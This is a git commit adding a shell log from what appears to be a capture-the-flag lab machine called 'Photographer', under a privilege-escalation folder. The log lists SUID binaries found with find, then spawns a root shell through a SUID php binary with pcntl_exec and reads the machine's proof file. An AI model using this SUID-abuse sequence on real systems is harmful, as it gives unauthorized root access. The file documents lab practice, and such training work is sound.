fbdcfd268b6940edcabeeaa2665006e840f62a00
MMammadli <mmemmedli676@gmail.com>
2026-03-26 08:44:49 -0400

    Create command.sh

---
+++ Photographer/Priviledge-Escalation/command.sh
@@ -0,0 +1,70 @@
+www-data@photographer:/home/agi$ find / -perm -4000 -type f 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/sbin/pppd
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/php7.2
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/chfn
+/bin/ping
+/bin/fusermount
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/su
+www-data@photographer:/home/agi$ php -r 'pcntl_exec("/bin/sh", ["-p"]);'
+php -r 'pcntl_exec("/bin/sh", ["-p"]);'
+# whoami
+whoami
+root
+# ls
+ls
+Desktop    Downloads  Pictures  Templates  examples.desktop
+Documents  Music      Public    Videos     share
+# cd /root
+cd /root
+# ls
+ls
+proof.txt
+# cat proof.txt
+cat proof.txt
+                                                                   
+                                .:/://::::///:-`                                
+                            -/++:+`:--:o:  oo.-/+/:`                            
+                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         
+                       :o:``oyo/o`. `      ```/-so:+--+/`                       
+                     -o:-`yh//.                 `./ys/-.o/                      
+                    ++.-ys/:/y-                  /s-:/+/:/o`                    
+                   o/ :yo-:hNN                   .MNs./+o--s`                   
+                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   
+                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  
+                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  
+                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 
+                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 
+                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 
+                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 
+                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  
+                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  
+                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   
+                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    
+                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     
+                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       
+                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         
+                           -/+/-:-/y+/d:yh-o:+--/+/:`                           
+                              `-///////////////:`                               
+                                                                                
+
+Follow me at: http://v1n1v131r4.com
+
+
+d41d8cd98f00b204e9800998ecf8427e
